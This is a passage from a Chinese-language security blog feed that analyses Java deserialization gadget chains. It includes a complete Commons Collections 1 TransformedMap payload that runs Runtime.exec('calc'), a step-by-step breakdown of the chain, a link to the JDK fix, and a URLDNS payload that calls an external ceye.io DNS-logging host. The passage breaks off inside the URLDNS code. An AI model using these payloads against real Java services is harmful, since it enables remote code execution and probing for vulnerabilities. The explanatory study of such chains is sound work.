class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        innerMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span> <span class="token string">"xxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token punctuation">&gt;</span></span> outerMap <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> construct <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        construct<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> obj <span class="token operator">=</span> construct<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Retention</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> outerMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ByteArrayOutputStream</span> barr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        System.out.println(new String(Base64.getEncoder().encode(barr.toByteArray())));</span>        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="payload分析"><a href="#payload分析" class="headerlink" title="payload分析"></a>payload分析</h2><h3 id="关键代码解析"><a href="#关键代码解析" class="headerlink" title="关键代码解析"></a>关键代码解析</h3><h4 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h4><p>Transformer是一个接口，仅有一个待实现的方法transform</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220703170854378.png" alt="image-20220703170854378"></p><h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>ConstantTransformer是实现了Transformer接口的类，它的作用是将初始化时传入的对象在transform()方法返回</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220703171100535.png"></p><h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>InvokerTransformer实现了Transformer接口，在初始化是它需要传入三个参数，分别是方法名、参数类型和参数列表。而在InvokerTransformer的transform()方法会实例化传入的方法对象，并调用该对象的invoke()方法</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220703171540155.png" alt="image-20220703171540155"></p><h4 id="invoke"><a href="#invoke" class="headerlink" title="invoke()"></a>invoke()</h4><p>执行方法的方法。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>调用主体为方法对象<br>第一个参数为方法对象所属的对象。后边的参数都为方法的入参<br>如method.invoke(class,args…)即为调用class的method方法，入参为args…</p><p>又例如我们本地rce代码常常为</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么用反射来rce的写法就是</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> clazzRuntime <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取Runtime类</span>clazzRuntime<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>clazzRuntime<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>clazzRuntime<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 第二个invoke为执行Runtime类的getRuntime方法，相当于Runtime.getRuntime()</span><span class="token comment">// 第一个invoke为执行Runtime.getRuntime()对象的exec方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>初始化方法需要传入Transformer数组，而在transform()方法，会遍历传入的数据，数组中上一个Transformer对象的transformer()方法的返回值将作为下一次Transformer对象的transformer()方法的入参。</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220703173134752.png" alt="image-20220703173134752"></p><h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> outerMap <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span><span class="token class-name">Map</span> map<span class="token punctuation">,</span> <span class="token class-name">Transformer</span> keyTransformer<span class="token punctuation">,</span> <span class="token class-name">Transformer</span> valueTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>TransformedMap.decorate()方法会装饰Map，为Map中的key和value分别调用keyTransformer和valueTransformer作为装饰</p><h3 id="payload拆解"><a href="#payload拆解" class="headerlink" title="payload拆解"></a>payload拆解</h3><p>拆解前我们先看一个本地rce的demo拆解</p><p><strong>demo</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRCEByTransformedMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        innerMap.put("value", "xxx");</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> outerMap <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>        outerMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span> <span class="token string">"xxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析下demo的方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>        <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>组织rce的命令即Runtime.getRuntime().exec(“calc”);</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">   <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token punctuation">&gt;</span></span> outerMap <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>outerMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span> <span class="token string">"xxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>准备命令被执行的条件，装饰innerMap生成一个outerMap。此时我们向outerMap中put一个数据，就会触发transformerChain这个装饰器，继而rce</p><p>但此时我们是在本地put数据，而攻击时不会有人帮助我们执行put操作。因此我们需要找到一个可以帮助我们执行put操作的方法。</p><p><strong>回到payload</strong></p><p>接着demo的分析，payload中出现这段就是因为sun.reflect.annotation.AnnotationInvocationHandler会帮助我们执行put操作</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> construct <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>construct<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> obj <span class="token operator">=</span> construct<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Retention</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> outerMap<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其实看payload我们不难发现，最终执行的就是sun.reflect.annotation.AnnotationInvocationHandler的readObject方法，看下代码</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220703175815363.png" alt="image-20220703175815363"></p><p>我们看到在361行执行了setValue，这样就会触发我们在outerMap设置的装饰器transformerChain，达到rce的目的</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220703180055255.png" alt="image-20220703180055255"></p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><pre class="line-numbers language-none"><code class="language-none">sun.reflect.annotation.AnnotationInvocationHandler#readObject()TransformedMap#setValue()ChainedTransformer#transform()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="主要原理"><a href="#主要原理" class="headerlink" title="主要原理"></a>主要原理</h2><p>主要利用TransformedMap的特性，为Map增加一个回调，在进行put操作时触发我们构造好的transformerChain，而该put操作在sun.reflect.annotation.AnnotationInvocationHandler的readObject方法中可找到，因此串起来了整个利用链。</p><h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p><a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d</a></p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220703180433526.png" alt="image-20220703180433526"></p><p>官方在这里新创建了一个LinkedHashMap，用于put数据，修复了该漏洞。</p><h2 id="为什么在要innerMap-put-“value”-“xxx”"><a href="#为什么在要innerMap-put-“value”-“xxx”" class="headerlink" title="为什么在要innerMap.put(“value”, “xxx”);"></a>为什么在要innerMap.put(“value”, “xxx”);</h2><p>其实在sun.reflect.annotation.AnnotationInvocationHandler的readObject()方法中，执行setValue()需要一个前提条件</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220703180617269.png"></p><p>var7 != null，这里就不分析了。看下P神的解释吧</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220703181744416.png" alt="image-20220703181744416"></p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> cc1 </tag>
            
            <tag> TransformedMap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-sec: 01. urldns</title>
      <link href="/2022/07/01/java-sec-01-urldns/"/>
      <url>/2022/07/01/java-sec-01-urldns/</url>
      
        <content type="html"><![CDATA[<h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><p>通过设置HashMap中key(java.net.URL)的hashCode=-1触发hashCode的重新计算，从而造成DNS解析。</p><h2 id="完整payload"><a href="#完整payload" class="headerlink" title="完整payload"></a>完整payload</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>outlaws<span class="token punctuation">.</span>urldns</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token comment">/** * @auther : outlaws * @date : 2022/7/1 19:21 * @use :  * @https://github.com/outlaws-bai/java-sec/blob/main/src/main/java/com/outlaws/urldns/URLDNS.java */</span><span class="token keyword">public</span> <span class="token keyword">class</span> URLDNS <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token comment">//1.加载Class对象</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.net.URL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//利用java反射机制获取url的hashcode</span>        <span class="token class-name">Field</span> filed <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//因为hashCode是私有方法，所以要设置true</span>        filed<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//这里直接new 一个对象</span>        <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">"http://b.7e1t2z.ceye.io"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 这里set是因为hashCode默认为-1，设置一个不为-1的，就不会本地触发dns解析</span>        filed<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token number">0x1111</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span>URL<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token string">"xxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// hashCode 这个属性放进去后设回 -1, 这样在反序列化时就会重新计算 hashCode</span>        filed<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//序列化成对象，输出出来</span>        <span class="token class-name">ByteArrayOutputStream</span> barr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> objos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        objos<span class="token 